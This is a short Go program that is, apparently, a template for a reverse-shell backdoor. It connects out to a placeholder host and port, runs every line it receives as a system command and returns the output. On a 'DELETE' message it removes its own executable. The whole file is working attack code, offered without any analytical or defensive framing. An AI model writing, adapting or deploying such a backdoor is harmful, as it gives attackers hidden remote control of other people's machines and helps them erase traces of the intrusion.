package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func FUNC_DELETE() {
	os.Remove(os.Args[0])
}

func FUNC_HANDLE(conn net.Conn) {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	if message == "DELETE\n" {
		FUNC_DELETE()
	}
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func main() {
	conn, _ := net.Dial("CONN_TYPE", "HOST:PORT")
	for {
		FUNC_HANDLE(conn)
	}
}
